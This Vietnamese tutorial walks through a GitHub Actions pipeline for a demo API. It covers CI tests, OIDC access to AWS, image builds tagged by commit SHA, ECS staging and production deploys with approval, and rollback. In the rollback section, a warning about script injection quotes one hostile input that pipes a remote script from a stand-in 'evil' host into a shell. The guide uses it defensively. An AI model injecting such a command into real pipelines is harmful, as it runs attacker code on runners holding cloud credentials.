# CI/CD cho demo-api: GitHub Actions → AWS (OIDC) → ECS Fargate

Hướng dẫn này áp dụng **lộ trình tuần 4 (CI/CD, 9–15/11)** vào repo `demo-api-ecs`. Kết thúc tuần, pipeline phải đạt mốc:

> Merge vào `main` là tự build, test, deploy staging; production có bước duyệt; rollback xong trong 10 phút.

| Ngày | Chủ đề | Kết quả cần có |
|---|---|---|
| T2 9/11 | [Workflow CI đầu tiên](#ngày-1--workflow-ci-đầu-tiên) | `ci.yml` chạy mỗi PR, có cache |
| T3 10/11 | [Unit test & bảo vệ `main`](#ngày-2--unit-test-và-bảo-vệ-nhánh-main) | Bộ test, branch protection |
| T4 11/11 | [GitHub Actions → AWS qua OIDC](#ngày-3--github-actions--aws-qua-oidc) | Role IAM, job in ra role ARN |
| T5 12/11 | [Build & push image](#ngày-4--build-và-push-image-trong-pipeline) | Image tag = commit SHA, endpoint `/version` |
| T6 13/11 | [Staging, duyệt production, rollback](#ngày-5--deploy-staging-duyệt-production-rollback) | Mốc tuần 4 |

---

## 0. Bức tranh tổng thể

```
 Developer ── PR ──► GitHub ──► ci.yml (build + test, KHÔNG có quyền AWS)
                        │
                     merge main
                        ▼
                   deploy.yml
   ┌────────────────────┼─────────────────────────────────────────────┐
   │ job ci             │ (gọi lại ci.yml – test fail thì dừng)        │
   │ job build-push     │ OIDC → STS → role tạm → docker push ECR:<sha>│
   │ job deploy-staging │ env "staging"  → ECS update → smoke test     │
   │ job deploy-prod    │ env "production" ⏸ chờ người duyệt → ECS     │
   └────────────────────┴─────────────────────────────────────────────┘
   rollback.yml (bấm tay): nhập SHA cũ → deploy lại đúng image đó
```

Nguyên tắc chính:

- **Build một lần, deploy nhiều nơi.** Image build đúng một lần, tag bằng commit SHA. Staging và production chạy *cùng một image*, không build lại.
- **Không có access key nào trong GitHub.** Pipeline xin credential tạm thời (hết hạn sau 1 giờ) qua OIDC.
- **Pipeline sở hữu phiên bản image, Terraform sở hữu hạ tầng.** Terraform không được "kéo ngược" image về `latest` sau mỗi lần apply (xem [mục 0.2](#02-sửa-terraform-cho-pipeline)).

### 0.1 Tách staging và production

Terraform hiện có đúng một môi trường. Mọi tài nguyên đều đặt tên theo `var.project_name`, nên tạo 2 môi trường bằng **Terraform workspace** + đổi `project_name`:

```bash
cd terraform
terraform init

terraform workspace new staging
terraform apply -var project_name=demo-api-staging

terraform workspace new prod
terraform apply -var project_name=demo-api-prod
```

Mỗi workspace có state riêng, nên xoá một môi trường không ảnh hưởng môi trường kia. Kết quả:

| | staging | production |
|---|---|---|
| ECS cluster | `demo-api-staging-cluster` | `demo-api-prod-cluster` |
| ECS service | `demo-api-staging-service` | `demo-api-prod-service` |
| Task definition family | `demo-api-staging-task` | `demo-api-prod-task` |
| ALB URL | `terraform output alb_dns_name` | (tương tự) |

**Về ECR:** mỗi workspace tạo một ECR repo riêng, nhưng pipeline chỉ dùng **`demo-api-staging`** làm kho image chung. Production chạy *cùng URI image đó*. Execution role của ECS có policy `AmazonECSTaskExecutionRolePolicy` (cho phép pull ECR trên `*` trong cùng account), nên task production pull được image từ repo staging. Sang tuần 5 (IaC), tách ECR ra một stack dùng chung cho gọn.

> Chi phí: 2 môi trường = 2 RDS + 2 ALB. Học xong thì `terraform destroy` workspace `prod`.

### 0.2 Sửa Terraform cho pipeline

Ba thay đổi nhỏ trong [terraform/ecs.tf](../terraform/ecs.tf) và [terraform/alb.tf](../terraform/alb.tf):

```hcl
# terraform/ecs.tf – trong resource "aws_ecs_service" "app"
resource "aws_ecs_service" "app" {
  # ... giữ nguyên các thuộc tính cũ ...

  # Task mới không lên được (crash, health check fail) → ECS tự quay lại bản trước
  deployment_circuit_breaker {
    enable   = true
    rollback = true
  }

  # Pipeline đăng ký task definition mới mỗi lần deploy.
  # Không có dòng này, `terraform apply` sẽ đưa service về image `var.image_tag`.
  lifecycle {
    ignore_changes = [task_definition]
  }
}
```

```hcl
# terraform/alb.tf – trong resource "aws_lb_target_group" "app"
  deregistration_delay = 30   # mặc định 300s → mỗi lần deploy chờ thêm 5 phút vô ích
```

Thêm output để điền vào GitHub:

```hcl
# terraform/outputs.tf
output "ecs_cluster_name"      { value = aws_ecs_cluster.main.name }
output "ecs_service_name"      { value = aws_ecs_service.app.name }
output "task_definition_family" { value = aws_ecs_task_definition.app.family }
```

---

## Ngày 1 – Workflow CI đầu tiên

**Mục tiêu:** mỗi PR tự động được build và test.

### Khái niệm

| Thuật ngữ | Nghĩa |
|---|---|
| **Workflow** | Một file YAML trong `.github/workflows/`. Một repo có nhiều workflow. |
| **Trigger** (`on:`) | Sự kiện kích hoạt: `pull_request`, `push`, `workflow_dispatch` (bấm tay), `workflow_call` (workflow khác gọi). |
| **Job** | Một nhóm step chạy trên **một máy riêng**. Các job mặc định chạy song song; dùng `needs:` để xếp thứ tự. |
| **Step** | Một lệnh shell (`run:`) hoặc một action dựng sẵn (`uses:`). Các step trong job dùng chung ổ đĩa. |
| **Runner** | Máy chạy job. `ubuntu-latest` là máy ảo GitHub cấp mới hoàn toàn cho mỗi job, chạy xong thì huỷ. |
| **Action** | Gói step tái sử dụng, ví dụ `actions/checkout@v4`. |

### Tạo `.github/workflows/ci.yml`

```yaml
name: CI

on:
  pull_request:
    branches: [main]
  workflow_call:          # cho phép deploy.yml gọi lại đúng workflow này

permissions:
  contents: read          # CI không cần quyền gì khác, cũng không cần AWS

jobs:
  build-test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20          # giữ đúng với Dockerfile (node:20-alpine)
          cache: npm                # cache ~/.npm theo hash của package-lock.json

      - run: npm ci                 # cài đúng theo lock file, fail nếu lock lệch
      - run: npm run build          # tsc: lỗi type là fail
      - run: npm test

      - name: Docker build (kiểm tra Dockerfile, không push)
        run: docker build -t demo-api:ci .
```

`npm ci` khác `npm install`: nó xoá `node_modules`, cài **đúng** phiên bản trong `package-lock.json` và báo lỗi nếu lock không khớp `package.json`. Nên đổi luôn `RUN npm install` trong [Dockerfile](../Dockerfile) thành `RUN npm ci` (stage runtime: `npm ci --omit=dev`).

> Node 20 hết hỗ trợ từ 30/04/2026. Nâng lên Node 22/24 ở một PR riêng, nhớ đổi cả `node-version` và image trong Dockerfile.

### Kiểm tra (tiêu chí bắt buộc)

- [ ] Mở PR: PR hiện check **CI / build-test** màu xanh.
- [ ] Cố ý làm code không build được (ví dụ `const x: number = "a"`): check chuyển đỏ.
- [ ] Chạy lại lần 2: log bước `setup-node` có `Cache restored`. Ghi thời gian 2 lần vào `LEARNING_LOG.md`.

---

## Ngày 2 – Unit test và bảo vệ nhánh main

**Mục tiêu:** có bộ test tối thiểu, không ai đẩy thẳng vào `main`.

### 2.1 Tách `app` khỏi `listen` để test được

Hiện [src/index.ts](../src/index.ts) vừa tạo app vừa kết nối DB và `listen`. Import nó trong test sẽ mở cổng thật. Tách làm 2 file:

```ts
// src/app.ts
import express from "express";
import { pool } from "./db";
import { itemsRouter } from "./routes/items";
import { tasksRouter } from "./routes/tasks";
import { attachmentsRouter } from "./routes/attachments";

export const app = express();
app.use(express.json());

app.get("/health", async (_req, res) => {
  try {
    await pool.query("SELECT 1");
    res.json({ status: "ok" });
  } catch (err) {
    res.status(503).json({ status: "db_unreachable", error: (err as Error).message });
  }
});

// Ngày 4 dùng endpoint này để biết đang chạy commit nào
app.get("/version", (_req, res) => {
  res.json({ sha: process.env.GIT_SHA ?? "dev" });
});

app.use("/items", itemsRouter);
app.use("/api/tasks", tasksRouter);
app.use("/api", attachmentsRouter);
```

```ts
// src/index.ts
import { app } from "./app";
import { ensureSchema } from "./db";

const port = Number(process.env.PORT || 3000);

async function start() {
  await ensureSchema();
  app.listen(port, () => console.log(`demo-api listening on port ${port}`));
}

start().catch((err) => {
  console.error("failed to start server", err);
  process.exit(1);
});
```

### 2.2 Viết test bằng `node:test` + supertest

```bash
npm i -D tsx supertest @types/supertest
```

`package.json`:

```json
"scripts": {
  "test": "tsx --test test/*.test.ts"
}
```

`test/app.test.ts` — dùng `t.mock.method` thay `pool.query`, nên **không cần database**:

```ts
import { test } from "node:test";
import assert from "node:assert/strict";
import request from "supertest";
import { app } from "../src/app";
import { pool } from "../src/db";

test("GET /version trả về GIT_SHA", async () => {
  process.env.GIT_SHA = "abc123";
  const res = await request(app).get("/version");
  assert.equal(res.status, 200);
  assert.equal(res.body.sha, "abc123");
});

test("GET /health trả 503 khi DB lỗi", async (t) => {
  t.mock.method(pool, "query", async () => { throw new Error("boom"); });
  const res = await request(app).get("/health");
  assert.equal(res.status, 503);
});

test("GET /health trả 200 khi DB ổn", async (t) => {
  t.mock.method(pool, "query", async () => ({ rows: [{ "?column?": 1 }], rowCount: 1 }));
  const res = await request(app).get("/health");
  assert.equal(res.status, 200);
});

test("POST /items thiếu name trả 400", async () => {
  const res = await request(app).post("/items").send({});
  assert.equal(res.status, 400);
});

test("POST /items name không phải chuỗi trả 400", async () => {
  const res = await request(app).post("/items").send({ name: 123 });
  assert.equal(res.status, 400);
});

test("GET /items/:id không tồn tại trả 404", async (t) => {
  t.mock.method(pool, "query", async () => ({ rows: [], rowCount: 0 }));
  const res = await request(app).get("/items/999");
  assert.equal(res.status, 404);
});

test("DELETE /items/:id thành công trả 204", async (t) => {
  t.mock.method(pool, "query", async () => ({ rows: [], rowCount: 1 }));
  const res = await request(app).delete("/items/1");
  assert.equal(res.status, 204);
});
```

Thêm 1–3 test cho `routes/tasks.ts` hoặc `routes/attachments.ts` để đủ 5–10 test.

### 2.3 Branch protection cho `main`

GitHub → **Settings → Rules → Rulesets → New branch ruleset** (hoặc Settings → Branches → Add classic branch protection rule):

- Target: `main`
- ✅ Restrict deletions, ✅ Block force pushes
- ✅ **Require a pull request before merging** → Required approvals: **1**
- ✅ **Require status checks to pass** → thêm check `build-test`; tick *Require branches to be up to date*
- Bypass list: để trống (kể cả admin)

> Repo **private** trên tài khoản Free không bật được ruleset/branch protection. Dùng repo public, hoặc org GitHub Team. Làm một mình thì không tự approve PR của mình được: nhờ một thành viên trong team review.

### Kiểm tra

- [ ] `npm test` pass ở local và trong CI.
- [ ] Sửa sai một điều kiện (ví dụ bỏ `typeof name !== "string"`): ít nhất 1 test đỏ.
- [ ] `git push origin main` bị từ chối (`protected branch hook declined`).
- [ ] *(Nâng cao)* `tsx --test --experimental-test-coverage test/*.test.ts` để in coverage trong log CI.

---

## Ngày 3 – GitHub Actions → AWS qua OIDC

**Mục tiêu:** pipeline gọi được AWS mà **không lưu access key** ở GitHub.

### 3.1 Vì sao không dùng access key?

| | Access key trong GitHub Secrets | OIDC |
|---|---|---|
| Thời hạn | Vĩnh viễn, đến khi có người xoay | ~1 giờ, tự hết hạn |
| Lộ ra thì sao | Ai có key đều dùng được, ở bất cứ đâu | Token chỉ đổi được credential khi khớp điều kiện trust policy (repo, nhánh, environment) |
| Xoay vòng | Phải làm tay | Không có gì để xoay |
| Phạm vi | Mọi workflow/nhánh đọc được secret | Giới hạn theo claim `sub` |

### 3.2 Luồng OIDC

```
GitHub runner                    GitHub OIDC provider            AWS STS                 IAM role
     │ 1. xin ID token (JWT)            │                           │                        │
     │ ───────────────────────────────► │                           │                        │
     │ ◄─── JWT: iss, aud, sub, ... ─── │                           │                        │
     │ 2. AssumeRoleWithWebIdentity(role ARN, JWT) ───────────────► │                        │
     │                                  │ 3. lấy public key (JWKS) ◄┤ kiểm chữ ký, hạn dùng  │
     │                                  │                           │ 4. so aud/sub với ───► │ trust policy
     │ ◄──── 5. AccessKeyId + SecretKey + SessionToken (tạm, ≤1h) ──┤                        │
     │ 6. aws ecr / aws ecs ... bằng credential tạm                                          │
```

Các claim quan trọng trong JWT GitHub cấp:

| Claim | Ví dụ | Dùng để |
|---|---|---|
| `iss` | `https://token.actions.githubusercontent.com` | AWS biết token do ai cấp |
| `aud` | `sts.amazonaws.com` | Token dành cho STS, không dùng chỗ khác được |
| `sub` | `repo:namnt2211/demo-api-ecs:ref:refs/heads/main` | **Ai** đang xin: repo nào, nhánh nào |
| `sub` (job có `environment:`) | `repo:namnt2211/demo-api-ecs:environment:production` | Khi job khai báo environment, `sub` đổi sang dạng này |

> Điểm hay vấp: job nào có `environment:` thì `sub` **không còn** chứa `ref:refs/heads/main`. Trust policy phải liệt kê cả 2 dạng.

### 3.3 Tạo OIDC provider + role bằng Terraform

Tạo root module riêng `terraform/cicd/` (dùng chung cho mọi môi trường, không đặt trong workspace staging/prod):

```hcl
# terraform/cicd/main.tf
terraform {
  required_version = ">= 1.5.0"
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 5.0" }
  }
}

provider "aws" { region = var.aws_region }

variable "aws_region"  { default = "ap-southeast-1" }
variable "github_repo" { default = "namnt2211/demo-api-ecs" }   # owner/repo

data "aws_caller_identity" "current" {}

locals {
  account_id = data.aws_caller_identity.current.account_id
  ecr_repo   = "demo-api-staging"   # kho image dùng chung (mục 0.1)
}

# 1) Identity provider: AWS tin token do GitHub ký.
#    Mỗi account chỉ có 1 provider cho URL này. Nếu đã có, đổi sang data source.
resource "aws_iam_openid_connect_provider" "github" {
  url            = "https://token.actions.githubusercontent.com"
  client_id_list = ["sts.amazonaws.com"]
  # AWS hiện tự xác thực GitHub qua CA tin cậy, thumbprint chỉ để thoả schema
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

# 2) Trust policy: AI được assume role
data "aws_iam_policy_document" "trust" {
  statement {
    actions = ["sts:AssumeRoleWithWebIdentity"]
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:sub"
      values = [
        "repo:${var.github_repo}:ref:refs/heads/main",        # build-push, rollback/resolve
        "repo:${var.github_repo}:environment:staging",
        "repo:${var.github_repo}:environment:production",
      ]
    }
  }
}

resource "aws_iam_role" "github_actions" {
  name                 = "github-actions-demo-api"
  assume_role_policy   = data.aws_iam_policy_document.trust.json
  max_session_duration = 3600
}

# 3) Permission policy: role được LÀM GÌ (quyền tối thiểu)
data "aws_iam_policy_document" "deploy" {
  statement {
    sid       = "EcrLogin"
    actions   = ["ecr:GetAuthorizationToken"]
    resources = ["*"]                       # API này không hỗ trợ resource cụ thể
  }
  statement {
    sid = "EcrPushPullOneRepo"
    actions = [
      "ecr:BatchCheckLayerAvailability", "ecr:InitiateLayerUpload", "ecr:UploadLayerPart",
      "ecr:CompleteLayerUpload", "ecr:PutImage", "ecr:BatchGetImage",
      "ecr:DescribeImages", "ecr:DescribeRepositories",
    ]
    resources = ["arn:aws:ecr:${var.aws_region}:${local.account_id}:repository/${local.ecr_repo}"]
  }
  statement {
    sid       = "TaskDefinition"
    actions   = ["ecs:DescribeTaskDefinition", "ecs:RegisterTaskDefinition"]
    resources = ["*"]                       # 2 API này không hỗ trợ resource-level
  }
  statement {
    sid     = "UpdateDemoServices"
    actions = ["ecs:UpdateService", "ecs:DescribeServices"]
    resources = [
      "arn:aws:ecs:${var.aws_region}:${local.account_id}:service/demo-api-staging-cluster/demo-api-staging-service",
      "arn:aws:ecs:${var.aws_region}:${local.account_id}:service/demo-api-prod-cluster/demo-api-prod-service",
    ]
  }
  statement {
    sid       = "PassOnlyEcsRoles"
    actions   = ["iam:PassRole"]
    resources = ["arn:aws:iam::${local.account_id}:role/demo-api-*-ecs-*-role"]
    condition {
      test     = "StringEquals"
      variable = "iam:PassedToService"
      values   = ["ecs-tasks.amazonaws.com"]
    }
  }
}

resource "aws_iam_role_policy" "deploy" {
  name   = "deploy-demo-api"
  role   = aws_iam_role.github_actions.id
  policy = data.aws_iam_policy_document.deploy.json
}

output "role_arn" { value = aws_iam_role.github_actions.arn }
```

```bash
cd terraform/cicd
terraform init && terraform apply
terraform output -raw role_arn     # arn:aws:iam::<account>:role/github-actions-demo-api
```

Vì sao cần `iam:PassRole`: task definition mới tham chiếu `executionRoleArn` và `taskRoleArn`. Đăng ký nó nghĩa là "giao" 2 role này cho ECS. AWS bắt người gọi phải có quyền PassRole, để ngăn ai đó gắn một role mạnh hơn vào task rồi mượn quyền.

<details>
<summary>Làm bằng Console thay vì Terraform</summary>

1. **IAM → Identity providers → Add provider** → OpenID Connect. Provider URL `https://token.actions.githubusercontent.com`, Audience `sts.amazonaws.com`.
2. **IAM → Roles → Create role** → *Web identity* → chọn provider vừa tạo, audience `sts.amazonaws.com`, GitHub organization `namnt2211`, repository `demo-api-ecs`, branch `main`.
3. Đặt tên `github-actions-demo-api`, tạo inline policy với nội dung tương đương `deploy` ở trên.
4. Mở tab **Trust relationships → Edit**, sửa điều kiện `sub` thành danh sách 3 giá trị như Terraform (Console chỉ sinh sẵn dạng nhánh).

</details>

### 3.4 Khai báo biến trong GitHub

**Settings → Secrets and variables → Actions → Variables** (không phải Secrets: ARN của role không phải bí mật, credential thật không bao giờ nằm ở GitHub).

| Phạm vi | Tên | Giá trị |
|---|---|---|
| Repository | `AWS_DEPLOY_ROLE_ARN` | `arn:aws:iam::<account>:role/github-actions-demo-api` |
| Repository | `ECR_REPOSITORY` | `demo-api-staging` |

### 3.5 Workflow thử: `.github/workflows/aws-whoami.yml`

```yaml
name: AWS whoami
on: workflow_dispatch

permissions:
  id-token: write     # BẮT BUỘC: cho phép job xin OIDC token
  contents: read

jobs:
  whoami:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ap-southeast-1
      - run: aws sts get-caller-identity
```

Chạy từ tab **Actions → AWS whoami → Run workflow** (nhánh `main`). Kết quả mong đợi:

```json
{ "Arn": "arn:aws:sts::<account>:assumed-role/github-actions-demo-api/GitHubActions" }
```

### Kiểm tra

- [ ] Job in đúng ARN của role. Ghi trust policy vào `docs/iam-roles.md`.
- [ ] **Settings → Secrets** không có `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`.
- [ ] Chạy workflow từ một nhánh khác `main` → lỗi `Not authorized to perform sts:AssumeRoleWithWebIdentity`. Đó là bằng chứng trust policy chặn đúng.
- [ ] Giải thích được bằng lời: vì sao token bị lộ cũng khó bị lạm dụng (hạn ngắn, `aud`, `sub`, chữ ký).

---

## Ngày 4 – Build và push image trong pipeline

**Mục tiêu:** mỗi commit trên `main` có một image tương ứng trên ECR, tag bằng commit SHA.

### 4.1 Đưa SHA vào image

[Dockerfile](../Dockerfile), stage runtime:

```dockerfile
FROM node:20-alpine
WORKDIR /app
ENV NODE_ENV=production
ARG GIT_SHA=dev
ENV GIT_SHA=$GIT_SHA
COPY package*.json ./
RUN npm ci --omit=dev
COPY --from=build /app/dist ./dist
EXPOSE 3000
CMD ["node", "dist/index.js"]
```

Endpoint `/version` (đã thêm ở ngày 2) đọc `GIT_SHA`. SHA nằm *trong image*, không nằm trong task definition. Nhờ đó rollback về image cũ thì `/version` cũng trả SHA cũ, không thể "nói dối".

### 4.2 Vì sao tag theo SHA, không dùng `latest`?

- `latest` là nhãn **di động**: hôm nay trỏ image A, mai trỏ image B. Không biết production đang chạy code nào, không rollback được.
- SHA là **bất biến** và truy ngược được tới đúng commit, đúng PR.
- Nên bật `image_tag_mutability = "IMMUTABLE"` cho repo ECR để không ai ghi đè được một tag đã có (lúc đó [scripts/push-to-ecr.sh](../scripts/push-to-ecr.sh) không push `latest` lặp lại được nữa; deploy tay cũng dùng SHA).
- Nếu thêm ECR lifecycle policy, giữ đủ nhiều image (ví dụ 30 bản gần nhất) để còn cái mà rollback.

### 4.3 Phần đầu của `.github/workflows/deploy.yml`

```yaml
name: Deploy

on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

concurrency:
  group: deploy-main
  cancel-in-progress: false     # không huỷ deploy đang chạy giữa chừng

env:
  AWS_REGION: ap-southeast-1

jobs:
  ci:
    uses: ./.github/workflows/ci.yml     # test fail → các job sau không chạy

  build-push:
    needs: ci
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.meta.outputs.image }}
    steps:
      - uses: actions/checkout@v4

      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ env.AWS_REGION }}
          mask-aws-account-id: false     # để output `image` (chứa account id) truyền được sang job sau

      - id: ecr
        uses: aws-actions/amazon-ecr-login@v2

      - id: meta
        run: echo "image=${{ steps.ecr.outputs.registry }}/${{ vars.ECR_REPOSITORY }}:${{ github.sha }}" >> "$GITHUB_OUTPUT"

      - name: Build & push
        run: |
          docker build --build-arg GIT_SHA=${{ github.sha }} -t "${{ steps.meta.outputs.image }}" .
          docker push "${{ steps.meta.outputs.image }}"
```

### Kiểm tra

- [ ] 2 commit liên tiếp trên `main` → `aws ecr describe-images --repository-name demo-api-staging` thấy 2 tag SHA khác nhau.
- [ ] Đẩy một PR làm test fail rồi merge (nếu branch protection cho phép, thử trên nhánh nháp có trigger tương tự): job `build-push` bị **skipped**, không có image mới.
- [ ] Chạy image local: `docker run -p 3000:3000 <image>` → `curl localhost:3000/version` trả đúng SHA.

---

## Ngày 5 – Deploy staging, duyệt production, rollback

**Mục tiêu (mốc tuần 4):** merge là lên staging; production có bước duyệt; rollback được trong 10 phút, không thao tác console.

### 5.1 GitHub Environments

**Settings → Environments → New environment**, tạo 2 environment:

| | `staging` | `production` |
|---|---|---|
| Required reviewers | — | 1–2 người (bật *Prevent self-review* nếu đủ người) |
| Deployment branches | Selected: `main` | Selected: `main` |
| Variable `ECS_CLUSTER` | `demo-api-staging-cluster` | `demo-api-prod-cluster` |
| Variable `ECS_SERVICE` | `demo-api-staging-service` | `demo-api-prod-service` |
| Variable `ECS_TASK_FAMILY` | `demo-api-staging-task` | `demo-api-prod-task` |
| Variable `APP_URL` | `http://<alb staging>` | `http://<alb prod>` |

> Required reviewers trên repo **private** cần gói GitHub Team trở lên; repo public thì miễn phí.

Environment làm 3 việc: (1) chặn job lại chờ người duyệt; (2) cấp biến riêng theo môi trường; (3) đổi claim `sub` của OIDC thành `environment:<tên>`, nên AWS phân biệt được job nào đang deploy đi đâu.

### 5.2 Reusable workflow: `.github/workflows/_deploy-ecs.yml`

Deploy staging, deploy production và rollback đều làm cùng một việc: *đưa image X lên môi trường Y rồi kiểm tra*. Viết một lần, gọi 3 chỗ:

```yaml
name: Deploy to ECS (reusable)

on:
  workflow_call:
    inputs:
      environment:  { type: string, required: true }
      image:        { type: string, required: true }   # URI đầy đủ, tag = SHA
      expected-sha: { type: string, required: true }

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    environment:
      name: ${{ inputs.environment }}
      url: ${{ vars.APP_URL }}
    concurrency:
      group: deploy-${{ inputs.environment }}
      cancel-in-progress: false
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ap-southeast-1

      - name: Lấy task definition đang chạy
        run: |
          aws ecs describe-task-definition \
            --task-definition "${{ vars.ECS_TASK_FAMILY }}" \
            --query taskDefinition > task-def.json

      - name: Thay image mới vào container "app"
        id: render
        uses: aws-actions/amazon-ecs-render-task-definition@v1
        with:
          task-definition: task-def.json
          container-name: app
          image: ${{ inputs.image }}

      - name: Đăng ký revision mới + update service + chờ ổn định
        uses: aws-actions/amazon-ecs-deploy-task-definition@v2
        with:
          task-definition: ${{ steps.render.outputs.task-definition }}
          cluster: ${{ vars.ECS_CLUSTER }}
          service: ${{ vars.ECS_SERVICE }}
          wait-for-service-stability: true

      - name: Smoke test /version và /health
        env:
          APP_URL: ${{ vars.APP_URL }}
          EXPECTED: ${{ inputs.expected-sha }}
        run: |
          for i in $(seq 1 20); do
            got=$(curl -fsS "$APP_URL/version" | jq -r .sha || true)
            [ "$got" = "$EXPECTED" ] && break
            echo "lần $i: /version=$got, chờ ALB chuyển hết sang task mới..."
            sleep 6
          done
          if [ "$got" != "$EXPECTED" ]; then
            echo "::error::/version trả '$got', mong đợi '$EXPECTED'"; exit 1
          fi
          curl -fsS "$APP_URL/health"
```

Chuyện gì xảy ra bên trong ECS khi `UpdateService`:

1. Đăng ký **task definition revision** mới (`demo-api-staging-task:N+1`) chỉ khác ở `image`.
2. ECS **rolling update**: chạy task mới → đợi ALB health check `/health` pass → ngắt task cũ (sau `deregistration_delay`).
3. `wait-for-service-stability` đợi đến khi service về trạng thái ổn định. Nếu task mới không lên được, **circuit breaker** (mục 0.2) tự quay về revision cũ và bước này fail.

### 5.3 Hoàn thiện `deploy.yml`

Thêm vào sau job `build-push` ở ngày 4:

```yaml
  deploy-staging:
    needs: build-push
    uses: ./.github/workflows/_deploy-ecs.yml
    with:
      environment: staging
      image: ${{ needs.build-push.outputs.image }}
      expected-sha: ${{ github.sha }}

  deploy-production:
    needs: [build-push, deploy-staging]     # staging phải xanh trước
    uses: ./.github/workflows/_deploy-ecs.yml
    with:
      environment: production               # ⏸ dừng ở đây chờ reviewer bấm Approve
      image: ${{ needs.build-push.outputs.image }}
      expected-sha: ${{ github.sha }}
```

Production nhận **đúng URI image** staging vừa chạy. Không build lại, nên thứ đã được kiểm tra ở staging chính là thứ lên production.

### 5.4 Rollback: `.github/workflows/rollback.yml`

```yaml
name: Rollback

on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]
        required: true
      sha:
        description: "Commit SHA đầy đủ (40 ký tự) của bản muốn quay về"
        type: string
        required: true

permissions:
  contents: read
  id-token: write

jobs:
  resolve:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.check.outputs.image }}
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ap-southeast-1
          mask-aws-account-id: false

      - id: check
        env:
          SHA: ${{ inputs.sha }}            # qua env, KHÔNG nhét ${{ }} thẳng vào script
          REPO: ${{ vars.ECR_REPOSITORY }}
        run: |
          [[ "$SHA" =~ ^[0-9a-f]{40}$ ]] || { echo "::error::SHA không hợp lệ"; exit 1; }
          aws ecr describe-images --repository-name "$REPO" --image-ids imageTag="$SHA" > /dev/null \
            || { echo "::error::Không có image tag $SHA trong ECR"; exit 1; }
          uri=$(aws ecr describe-repositories --repository-names "$REPO" \
                  --query 'repositories[0].repositoryUri' --output text)
          echo "image=$uri:$SHA" >> "$GITHUB_OUTPUT"

  deploy:
    needs: resolve
    uses: ./.github/workflows/_deploy-ecs.yml
    with:
      environment: ${{ inputs.environment }}
      image: ${{ needs.resolve.outputs.image }}
      expected-sha: ${{ inputs.sha }}
```

Ghi chú:

- **Script injection:** nếu viết `run: echo ${{ inputs.sha }}`, người nhập `"; curl evil | sh; "` sẽ chạy được lệnh trên runner có quyền AWS. Luôn đưa input vào `env:` rồi dùng `"$SHA"`, kèm kiểm tra regex.
- Rollback production vẫn đi qua bước duyệt. Muốn kịp 10 phút thì reviewer phải trực sẵn trong buổi diễn tập.
- Lấy SHA cũ: `git log --oneline main`, hoặc tab Actions → lần deploy trước, hoặc `aws ecr describe-images`.
- **Phương án B** (khi GitHub Actions có sự cố): `aws ecs update-service --cluster demo-api-prod-cluster --service demo-api-prod-service --task-definition demo-api-prod-task:<revision cũ>`.

### Diễn tập (bấm giờ, ghi vào log)

1. Merge 1 PR nhỏ → mở link Actions, đo thời gian đến khi `curl $APP_URL/version` staging trả SHA mới (mục tiêu < 15 phút).
2. Cố ý làm `/health` trả 500 trên một PR → merge → pipeline **đỏ ở staging**, production không bị động tới (circuit breaker trả staging về bản trước).
3. Production đang ở bản B. Chạy **Rollback** → `production` + SHA của bản A → Approve → bấm giờ đến khi `/version` production trả SHA A (mục tiêu < 10 phút).
4. Mở PR `week-4`.

### Kiểm tra (mốc tuần 4)

- [ ] Merge PR → trong 15 phút `/version` staging trả SHA mới.
- [ ] `/health` lỗi → pipeline đỏ ở bước deploy/smoke test.
- [ ] Production không đổi khi chưa ai duyệt (job hiện *Waiting for review*).
- [ ] Rollback xong trong 10 phút, không thao tác console.

---

## Cấu trúc file cuối tuần

```
.github/workflows/
  ci.yml             # PR: build + test (không có quyền AWS)
  deploy.yml         # push main: ci → build-push → staging → (duyệt) → production
  _deploy-ecs.yml    # reusable: render task def → update service → smoke test
  rollback.yml       # bấm tay: SHA cũ → deploy lại
  aws-whoami.yml     # thử OIDC (xoá được sau ngày 3)
src/app.ts           # express app (test được), có /version
src/index.ts         # chỉ ensureSchema + listen
test/app.test.ts
terraform/cicd/      # OIDC provider + role github-actions-demo-api
docs/iam-roles.md    # trust policy + giải thích quyền
```

## Xử lý lỗi thường gặp

| Lỗi | Nguyên nhân | Cách sửa |
|---|---|---|
| `Credentials could not be loaded` / `Could not get ID token` | Thiếu `permissions: id-token: write` | Thêm ở workflow hoặc job. Với reusable workflow, **workflow gọi** cũng phải cấp quyền này. |
| `Not authorized to perform sts:AssumeRoleWithWebIdentity` | `sub` không khớp trust policy | Job có `environment:` → `sub` là `...:environment:<tên>`. Xem claim thực tế bằng `actions/github-script` in `core.getIDToken()` (đừng in token thật ra log public). |
| `AccessDenied ... iam:PassRole` | Role pipeline thiếu PassRole cho execution/task role | Kiểm tra pattern ARN `demo-api-*-ecs-*-role`. |
| `Skip output 'image' since it may contain secret` | Account ID bị mask | `mask-aws-account-id: false` ở job tạo output. |
| Deploy chờ rất lâu rồi mới xong | `deregistration_delay` mặc định 300s | Đặt 30s (mục 0.2). |
